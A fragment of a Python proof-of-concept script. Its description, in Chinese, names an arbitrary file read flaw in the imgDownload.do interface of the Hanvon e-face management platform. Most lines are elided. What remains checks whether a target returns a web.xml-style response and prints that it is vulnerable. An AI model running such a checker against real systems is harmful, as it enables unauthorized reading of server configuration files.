...
def poc(target):
    ...
    try:
        ...
        if res1.status_code == 200:
            ...
            if res2.status_code == 200 and '<?xml version="1.0" encoding="UTF-8"?>' in res2.text and '<web-app' in res2.text:
                print(f"[+]{target}存在漏洞")
...
def main():
    # 定义
    parse = argparse.ArgumentParser(description="汉王e脸通综合管理平台imgDownload.do接口存在任意文件读取")
